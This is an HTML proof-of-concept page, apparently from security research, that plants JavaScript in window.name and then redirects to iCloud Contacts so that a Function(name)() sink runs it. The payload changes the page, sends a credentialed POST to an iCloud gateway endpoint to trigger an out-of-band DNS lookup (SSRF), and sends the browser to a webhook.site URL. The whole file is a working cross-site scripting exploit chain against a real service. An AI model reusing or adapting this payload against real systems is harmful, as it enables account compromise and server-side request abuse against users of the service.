<!DOCTYPE html>
<html>
<head><title>iCloud</title></head>
<body>
<script>
// Diagnostic: if contacts page turns RED → Function(name)() ran + window.name survived
// If stays white → window.name was cleared before mandrill fired
window.name = [
  // Visible DOM test (no network needed)
  'document.body.style.background="red";',
  'document.title="XSS_FIRED";',
  // SSRF DNS OOB via Apple server (connect-src *.icloud.com allowed)
  'try{fetch("https://gateway.icloud.com/rsvp/events/v1/linkmetadata/",',
  '{method:"POST",credentials:"include",',
  'headers:{"Content-Type":"application/json"},',
  'body:JSON.stringify({url:"https://xss.', Date.now(), '.oob.dnshook.site"})});}catch(e){}',
  // HTTP nav OOB
  'window.top.location.href="https://webhook.site/oob?xss=fired&t=', Date.now(), '";'
].join('');

location.href = 'https://www.icloud.com/contacts/';
</script>
</body>
</html>
